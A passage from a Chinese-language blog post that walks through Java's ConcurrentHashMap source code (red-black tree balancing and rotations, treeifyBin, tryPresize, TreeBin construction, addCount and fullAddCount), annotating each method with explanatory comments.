<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">balanceInsertion</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                            TreeNode&lt;K,V&gt; x)</span> &#123;</span><br><span class="line">    x.red = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; xp, xpp, xppl, xppr;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((xp = x.parent) == <span class="literal">null</span>) &#123;</span><br><span class="line">            x.red = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!xp.red || (xpp = xp.parent) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span> (xp == (xppl = xpp.left)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((xppr = xpp.right) != <span class="literal">null</span> &amp;&amp; xppr.red) &#123;</span><br><span class="line">                xppr.red = <span class="literal">false</span>;</span><br><span class="line">                xp.red = <span class="literal">false</span>;</span><br><span class="line">                xpp.red = <span class="literal">true</span>;</span><br><span class="line">                x = xpp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (x == xp.right) &#123;</span><br><span class="line">                    <span class="comment">// xp左旋，详细：6.18</span></span><br><span class="line">                    root = rotateLeft(root, x = xp);</span><br><span class="line">                    xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                    xp.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                        xpp.red = <span class="literal">true</span>;</span><br><span class="line">                        <span class="comment">// xpp右旋，详细：6.19</span></span><br><span class="line">                        root = rotateRight(root, xpp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (xppl != <span class="literal">null</span> &amp;&amp; xppl.red) &#123;</span><br><span class="line">                xppl.red = <span class="literal">false</span>;</span><br><span class="line">                xp.red = <span class="literal">false</span>;</span><br><span class="line">                xpp.red = <span class="literal">true</span>;</span><br><span class="line">                x = xpp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (x == xp.left) &#123;</span><br><span class="line">                    root = rotateRight(root, x = xp);</span><br><span class="line">                    xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                    xp.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                        xpp.red = <span class="literal">true</span>;</span><br><span class="line">                        root = rotateLeft(root, xpp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-18-rotateLeft-TreeNode-root-TreeNode-p"><a href="#6-18-rotateLeft-TreeNode-root-TreeNode-p" class="headerlink" title="6.18 rotateLeft(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)"></a>6.18 rotateLeft(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)</h2><p>节点p围绕其右子节点左旋，与HashMap中的完全相同（HashMap源码分析的5.5.7），这里不再赘述。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateLeft</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                      TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; r, pp, rl;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (r = p.right) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((rl = p.right = r.left) != <span class="literal">null</span>)</span><br><span class="line">            rl.parent = p;</span><br><span class="line">        <span class="keyword">if</span> ((pp = r.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">            (root = r).red = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pp.left == p)</span><br><span class="line">            pp.left = r;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pp.right = r;</span><br><span class="line">        r.left = p;</span><br><span class="line">        p.parent = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-19-rotateRight-TreeNode-root-TreeNode-p"><a href="#6-19-rotateRight-TreeNode-root-TreeNode-p" class="headerlink" title="6.19 rotateRight(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)"></a>6.19 rotateRight(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)</h2><p>节点p围绕其左子节点右旋，与HashMap中的完全相同（HashMap源码分析的5.5.8），这里不再赘述。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateRight</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                       TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; l, pp, lr;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (l = p.left) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((lr = p.left = l.right) != <span class="literal">null</span>)</span><br><span class="line">            lr.parent = p;</span><br><span class="line">        <span class="keyword">if</span> ((pp = l.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">            (root = l).red = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pp.right == p)</span><br><span class="line">            pp.right = l;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pp.left = l;</span><br><span class="line">        l.right = p;</span><br><span class="line">        p.parent = l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-20-unlockRoot"><a href="#6-20-unlockRoot" class="headerlink" title="6.20 unlockRoot()"></a>6.20 unlockRoot()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">unlockRoot</span><span class="params">()</span> &#123;</span><br><span class="line">    lockState = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分割线-2"><a href="#分割线-2" class="headerlink" title="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</h2><h2 id="6-21-treeifyBin-Node-tab-int-index"><a href="#6-21-treeifyBin-Node-tab-int-index" class="headerlink" title="6.21 treeifyBin(Node&lt;K,V&gt;[] tab, int index)"></a>6.21 treeifyBin(Node&lt;K,V&gt;[] tab, int index)</h2><p>树化下标为index的tab节点元素，若tab长度小于MIN_TREEIFY_CAPACITY（也即64），则扩容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; b; <span class="type">int</span> n, sc;</span><br><span class="line">    <span class="keyword">if</span> (tab != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 数组长度小于MIN_TREEIFY_CAPACITY（也即64），尝试扩容，详细：6.22。</span></span><br><span class="line">        <span class="keyword">if</span> ((n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">            tryPresize(n &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// hash值 &gt;= 0说明为普通单链表节点。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((b = tabAt(tab, index)) != <span class="literal">null</span> &amp;&amp; b.hash &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (b) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, index) == b) &#123;</span><br><span class="line">                    TreeNode&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>; <span class="comment">// hd-头节点，tl-尾节点。</span></span><br><span class="line">                    <span class="keyword">for</span> (Node&lt;K,V&gt; e = b; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                        <span class="comment">// 转为红黑树节点</span></span><br><span class="line">                        TreeNode&lt;K,V&gt; p =</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;(e.hash, e.key, e.val,</span><br><span class="line">                                              <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                        <span class="comment">// 将尾节点作为p的上一个节点，且为null，说明第一轮遍历，则指定头节点为p。</span></span><br><span class="line">                        <span class="keyword">if</span> ((p.prev = tl) == <span class="literal">null</span>)</span><br><span class="line">                            hd = p;</span><br><span class="line">                        <span class="comment">// 反之，尾节点的下一个节点为p。</span></span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            tl.next = p;</span><br><span class="line">                        <span class="comment">// 把p作为新一轮的尾节点。</span></span><br><span class="line">                        tl = p;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 设置tab[index]=new TreeBin&lt;K,V&gt;(hd)，红黑树的元素节点为TreeBin，其root属性为红黑树的根节点，详细：6.23。</span></span><br><span class="line">                    setTabAt(tab, index, <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(hd));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-22-tryPresize-int-size"><a href="#6-22-tryPresize-int-size" class="headerlink" title="6.22 tryPresize(int size)"></a>6.22 tryPresize(int size)</h2><p>预处理确定容器大小。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">tryPresize</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> (size &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ? MAXIMUM_CAPACITY :</span><br><span class="line">    	tableSizeFor(size + (size &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((sc = sizeCtl) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab = table; <span class="type">int</span> n;</span><br><span class="line">        <span class="comment">// 容器为空，初始化容器，与6.3类似。</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>) &#123;</span><br><span class="line">            n = (sc &gt; c) ? sc : c;</span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (table == tab) &#123;</span><br><span class="line">                        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                        Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n];</span><br><span class="line">                        table = nt;</span><br><span class="line">                        sc = n - (n &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    sizeCtl = sc;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c &lt;= sc || n &gt;= MAXIMUM_CAPACITY)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tab == table) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">rs</span> <span class="operator">=</span> resizeStamp(n);</span><br><span class="line">            <span class="keyword">if</span> (sc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                Node&lt;K,V&gt;[] nt;</span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                    sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class="literal">null</span> ||</span><br><span class="line">                    transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, sc + <span class="number">1</span>))</span><br><span class="line">                    transfer(tab, nt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// sc &gt;= 0，扩容，详细：6.8。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc,</span><br><span class="line">                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class="number">2</span>))</span><br><span class="line">                transfer(tab, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-23-new-TreeBin-TreeNode-b"><a href="#6-23-new-TreeBin-TreeNode-b" class="headerlink" title="6.23 new TreeBin(TreeNode&lt;K,V&gt; b)"></a>6.23 new TreeBin(TreeNode&lt;K,V&gt; b)</h2><p>通过TreeNode构建TreeBin（把链表形态的TreeNode重构成红黑树，再绑定到TreeBin的root属性。），TreeBin中的root属性指向红黑树的根节点，而TreeBin作为包裹着红黑树的节点，存放在数组中。其自身不存放任何key&#x2F;value数据，但管理着当前数组元素的所有读写锁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeBin(TreeNode&lt;K,V&gt; b) &#123;</span><br><span class="line">    <span class="comment">// 红黑树的元素节点hash值固定为TREEBIN，即-2。</span></span><br><span class="line">    <span class="built_in">super</span>(TREEBIN, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// first节点为链表节点的头节点。</span></span><br><span class="line">    <span class="built_in">this</span>.first = b;</span><br><span class="line">    TreeNode&lt;K,V&gt; r = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 构建红黑树，此处的代码与HashMap分析中的5.6.2 treeify(Node&lt;K,V&gt;[] tab)几乎一样。</span></span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; x = b, next; x != <span class="literal">null</span>; x = next) &#123;</span><br><span class="line">        next = (TreeNode&lt;K,V&gt;)x.next;</span><br><span class="line">        x.left = x.right = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// x作为根节点插入，改为黑色。</span></span><br><span class="line">        <span class="keyword">if</span> (r == <span class="literal">null</span>) &#123;</span><br><span class="line">            x.parent = <span class="literal">null</span>;</span><br><span class="line">            x.red = <span class="literal">false</span>;</span><br><span class="line">            r = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> x.key;</span><br><span class="line">            <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> x.hash;</span><br><span class="line">            Class&lt;?&gt; kc = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = r;;) &#123;</span><br><span class="line">                <span class="type">int</span> dir, ph;</span><br><span class="line">                <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key;</span><br><span class="line">                <span class="comment">// h &lt; ph，左子树下插入。</span></span><br><span class="line">                <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                    dir = -<span class="number">1</span>;</span><br><span class="line">                <span class="comment">// h &gt; ph，右子树下插入。</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                    dir = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// hash一样，key没直接实现Comparable接口或k和pk类型不一样，无法比较。</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                          (kc = comparableClassFor(k)) == <span class="literal">null</span>) ||</span><br><span class="line">                         (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>)</span><br><span class="line">                    <span class="comment">// 则通过k,pk的hashCode大小来决定插入的方向。</span></span><br><span class="line">                    dir = tieBreakOrder(k, pk);</span><br><span class="line">                TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">                <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    x.parent = xp;</span><br><span class="line">                    <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">                        xp.left = x;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        xp.right = x;</span><br><span class="line">                    <span class="comment">// 对插入节点x做平衡调整。</span></span><br><span class="line">                    r = balanceInsertion(r, x);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.root = r;</span><br><span class="line">    <span class="comment">// 递归检查是否合法（略）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="title function_">checkInvariants</span><span class="params">(root)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分割线-3"><a href="#分割线-3" class="headerlink" title="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 分割线 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</h2><h2 id="6-24-addCount-long-x-int-check"><a href="#6-24-addCount-long-x-int-check" class="headerlink" title="6.24 addCount(long x, int check)"></a>6.24 addCount(long x, int check)</h2><p>键值对个数统计增加x。若容器太小，则扩容。或正在扩容，则帮助其完成扩容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addCount</span><span class="params">(<span class="type">long</span> x, <span class="type">int</span> check)</span> &#123;</span><br><span class="line">    CounterCell[] as; <span class="type">long</span> b, s;</span><br><span class="line">    <span class="comment">// 若counterCells不为null或CAS比较交换失败（出现争夺并发问题）。否则不需要利用计数对象数组进行计数，直接通过修改baseCount即可。</span></span><br><span class="line">    <span class="keyword">if</span> ((as = counterCells) != <span class="literal">null</span> ||</span><br><span class="line">        !U.compareAndSwapLong(<span class="built_in">this</span>, BASECOUNT, b = baseCount, s = b + x)) &#123;</span><br><span class="line">        CounterCell a; <span class="type">long</span> v; <span class="type">int</span> m;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">uncontended</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 若计数对象数组为空或其下对应的元素为null或CAS修改计数对象value失败（出现争夺），则调用fullAddCount，详细：6.25。</span></span><br><span class="line">        <span class="keyword">if</span> (as == <span class="literal">null</span> || (m = as.length - <span class="number">1</span>) &lt; <span class="number">0</span> ||</span><br><span class="line">            <span class="comment">// 注：通过ThreadLocalRandom.getProbe() &amp; (len-1)的方式，来确定计数器对象的下标位置。</span></span><br><span class="line">            (a = as[ThreadLocalRandom.getProbe() &amp; m]) == <span class="literal">null</span> ||</span><br><span class="line">            !(uncontended =</span><br><span class="line">              U.compareAndSwapLong(a, CELLVALUE, v = a.value, v + x))) &#123;</span><br><span class="line">            fullAddCount(x, uncontended);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (check &lt;= <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        s = sumCount();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (check &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab, nt; <span class="type">int</span> n, sc;</span><br><span class="line">        <span class="comment">// s为此时容器键值对个数，达到阈值且容器大小未达到最大值，则进行扩容。</span></span><br><span class="line">        <span class="keyword">while</span> (s &gt;= (<span class="type">long</span>)(sc = sizeCtl) &amp;&amp; (tab = table) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">               (n = tab.length) &lt; MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            <span class="comment">// 详细：6.7</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">rs</span> <span class="operator">=</span> resizeStamp(n);</span><br><span class="line">            <span class="comment">// 第一轮循环不会走这里，扩容前sc&gt;=0。</span></span><br><span class="line">            <span class="keyword">if</span> (sc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                    sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class="literal">null</span> ||</span><br><span class="line">                    transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, sc + <span class="number">1</span>))</span><br><span class="line">                    transfer(tab, nt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 第一轮循环执行这个分支。rs（rs范围：2^15 + [0, 32]）左移16位+2，即sizeCtl属性变成了负数。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc,</span><br><span class="line">                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class="number">2</span>))</span><br><span class="line">                <span class="comment">// 扩容，详细：6.8</span></span><br><span class="line">                transfer(tab, <span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 每次扩容完，重新计算容量是否符合要求，否则继续扩容。</span></span><br><span class="line">            s = sumCount();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-25-fullAddCount-long-x-boolean-wasUncontended"><a href="#6-25-fullAddCount-long-x-boolean-wasUncontended" class="headerlink" title="6.25 fullAddCount(long x, boolean wasUncontended)"></a>6.25 fullAddCount(long x, boolean wasUncontended)</h2><p>对计数器数组counterCells进行全局的更新。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// See LongAdder version for explanation</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">fullAddCount</span><span class="params">(<span class="type">long</span> x, <span class="type">boolean</span> wasUncontended)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">if</span> ((h = ThreadLocalRandom.getProbe()) == <span class="number">0</span>) &#123;</span><br><span class="line">        ThreadLocalRandom.localInit();      <span class="comment">// force initialization</span></span><br><span class="line">        h = ThreadLocalRandom.getProbe();</span><br><span class="line">        wasUncontended = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">collide</span> <span class="operator">=</span> <span class="literal">false</span>;                <span class="comment">// True if last slot nonempty</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        CounterCell[] as; CounterCell a; <span class="type">int</span> n; <span class="type">long</span> v;</span><br><span class="line">        <span class="keyword">if</span> ((as = counterCells) != <span class="literal">null</span> &amp;&amp; (n = as.length) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 计数器数组指定下标的计数器为null。</span></span><br><span class="line">            <span class="keyword">if</span> ((a = as[(n - <span class="number">1</span>) &amp; h]) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cellsBusy == <span class="number">0</span>) &#123;            <span class="comment">// Try to attach new Cell</span></span><br><span class="line">                    <span class="comment">// 创建计数器。</span></span><br><span class="line">                    <span class="type">CounterCell</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CounterCell</span>(x); <span class="comment">// Optimistic create</span></span><br><span class="line">                    <span class="keyword">if</span> (cellsBusy == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                        <span class="comment">// 计数器加锁</span></span><br><span class="line">                        U.compareAndSwapInt(<span class="built_in">this</span>, CELLSBUSY, <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">created</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;               <span class="comment">// Recheck under lock</span></span><br><span class="line">                            CounterCell[] rs; <span class="type">int</span> m, j;</span><br><span class="line">                            <span class="keyword">if</span> ((rs = counterCells) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                                (m = rs.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">                                rs[j = (m - <span class="number">1</span>) &amp; h] == <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="comment">// 插入计数器到指定下标。</span></span><br><span class="line">                                rs[j] = r;</span><br><span class="line">                                created = <span class="literal">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                            <span class="comment">// 解锁</span></span><br><span class="line">                            cellsBusy = <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (created)</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">continue</span>;           <span class="comment">// Slot is now non-empty</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                collide = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (!wasUncontended)       <span class="comment">// CAS already known to fail</span></span><br><span class="line">                wasUncontended = <span class="literal">true</span>;      <span class="comment">// Continue after rehash</span></span><br><span class="line">            <span class="comment">// 比较后更新cell的value为v + x。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapLong(a, CELLVALUE, v = a.value, v + x))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (counterCells != as || n &gt;= NCPU)</span><br><span class="line">                collide = <span class="literal">false</span>;            <span class="comment">// At max size or stale</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (!collide)</span><br><span class="line">                collide = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cellsBusy == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                     U.compareAndSwapInt(<span class="built_in">this</span>, CELLSBUSY, <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (counterCells == as) &#123;<span class="comment">// Expand table unless stale</span></span><br><span class="line">                        CounterCell[] rs = <span class="keyword">new</span> <span class="title class_">CounterCell</span>[n &lt;&lt; <span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">                            rs[i] = as[i];</span><br><span class="line">                        counterCells = rs;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    cellsBusy = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                collide = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">continue</span>;                   <span class="comment">// Retry with expanded table</span></span><br><span class="line">            &#125;</span><br><span class="line">            h = ThreadLocalRandom.advanceProbe(h);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cellsBusy == <span class="number">0</span> &amp;&amp; counterCells == as &amp;&amp;</span><br><span class="line">                 U.compareAndSwapInt(<span class="built_in">this</span>, CELLSBUSY, <span class="number">0</span>, <span class="number">1</span>)) 